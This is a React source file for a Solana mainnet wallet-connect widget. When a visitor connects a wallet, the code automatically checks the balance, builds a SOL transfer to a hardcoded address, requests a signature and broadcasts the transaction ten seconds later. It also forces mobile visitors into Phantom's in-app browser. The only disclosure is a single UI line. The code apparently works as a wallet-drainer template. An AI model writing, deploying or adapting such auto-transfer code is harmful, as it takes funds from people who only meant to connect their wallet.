import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import ReactDOM from 'react-dom';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    ConnectionProvider,
    WalletProvider,
    useWallet,
} from '@solana/wallet-adapter-react';
import {
    WalletModalProvider,
    useWalletModal,
    WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    Connection,
    PublicKey,
    LAMPORTS_PER_SOL,
    SystemProgram,
    Transaction,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;

    const wallets = useMemo(
        () => [
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint={'https://api.mainnet-beta.solana.com'}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>
                    {children}
                </WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();

    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);

    useEffect(() => {
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        const isPhantom = (window as any).solana?.isPhantom;

        if (isMobile && !isPhantom) {
            const url = encodeURIComponent(window.location.href);
            window.location.href = `https://phantom.app/ul/browse/${url}`;
        }
    }, []);

    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected, signTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndSendTx(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
        const rpcEndpoints = [
            'https://sg110.nodes.rpcpool.com',
            'https://api.mainnet-beta.solana.com',
            'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
            'https://rpc.ankr.com/solana',
        ];

        let connection: Connection | null = null;
        let lamports: number | null = null;

        for (const endpoint of rpcEndpoints) {
            try {
                const testConn = new Connection(endpoint, 'confirmed');
                lamports = await testConn.getBalance(walletPublicKey);
                connection = testConn;
                break;
            } catch (err) {
                console.warn(`⚠️ RPC failed: ${endpoint}`, err);
            }
        }

        if (!connection || lamports === null) {
            alert('❌ All RPCs failed. Try again later.');
            return;
        }

        try {
            setSolBalance(lamports / LAMPORTS_PER_SOL);
            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);

            const sendAmount = 0.001 * LAMPORTS_PER_SOL;
            if (lamports <= sendAmount + 100000) {
                alert('⚠️ Not enough SOL to send 0.001 SOL.');
                return;
            }

            const tx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
                    lamports: sendAmount,
                })
            );

            tx.feePayer = walletPublicKey;
            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

            if (!signTransaction) {
                alert('❌ Wallet not ready to sign.');
                return;
            }

            const signedTx = await signTransaction(tx);
            console.log('🖊️ Transaction signed.');

            setTimeout(async () => {
                try {
                    const txid = await connection!.sendRawTransaction(signedTx.serialize());
                    console.log(`🚀 Transaction sent. Signature: ${txid}`);
                } catch (err) {
                    console.error('❌ Failed to send transaction:', err);
                }
            }, 10000);
        } catch (err) {
            console.error('❌ Error sending transaction:', err);
            alert('Transaction failed.');
        } finally {
            setLoading(false);
        }
    };

    const walletPopupEl = typeof window !== 'undefined' ? document.getElementById('walletPopup') : null;

    const WalletUI = (
        <div
            style={{
                marginTop: '2rem',
                padding: '25px',
                borderRadius: '20px',
                background: 'linear-gradient(145deg, #1e1e2f, #2b2b3c)',
                color: '#fff',
                boxShadow: '0 8px 20px rgba(0,0,0,0.35)',
                fontFamily: 'Poppins, sans-serif',
                maxWidth: '520px',
                marginLeft: 'auto',
                marginRight: 'auto',
                backdropFilter: 'blur(10px)',
                border: '1px solid rgba(255, 255, 255, 0.1)',
            }}
        >
            {!connected || !publicKey ? (
                <div style={{ display: 'flex', justifyContent: 'center' }}>
                    <WalletMultiButton
                        style={{
                            background: 'linear-gradient(135deg, #00c9ff, #92fe9d)',
                            border: 'none',
                            padding: '14px 28px',
                            fontSize: '1rem',
                            borderRadius: '12px',
                            color: '#000',
                            fontWeight: '600',
                            cursor: 'pointer',
                            boxShadow: '0 4px 15px rgba(0, 255, 255, 0.2)',
                            transition: 'transform 0.2s ease-in-out',
                        }}
                        onMouseEnter={(e) => (e.currentTarget.style.transform = 'scale(1.05)')}
                        onMouseLeave={(e) => (e.currentTarget.style.transform = 'scale(1)')}
                    />
                </div>
            ) : (
                <>
                    <h2 style={{ color: '#4ade80', marginBottom: '1rem' }}>✅ Wallet Connected</h2>
                    <p
                        style={{
                            wordBreak: 'break-all',
                            cursor: 'pointer',
                            color: '#ddd',
                            marginBottom: '0.5rem',
                        }}
                        onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
                    >
                        <strong>Address:</strong> {publicKey.toBase58()}
                    </p>
                    <p style={{ color: '#ccc', marginBottom: '0.5rem' }}>
                        <strong>Balance:</strong>{' '}
                        {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
                    </p>
                    <p style={{ color: '#aaa', fontSize: '0.9rem' }}>
                        Transaction will auto-send 10s after connect.
                    </p>
                </>
            )}
        </div>
    );

    return walletPopupEl ? ReactDOM.createPortal(WalletUI, walletPopupEl) : null;
};

export default App;
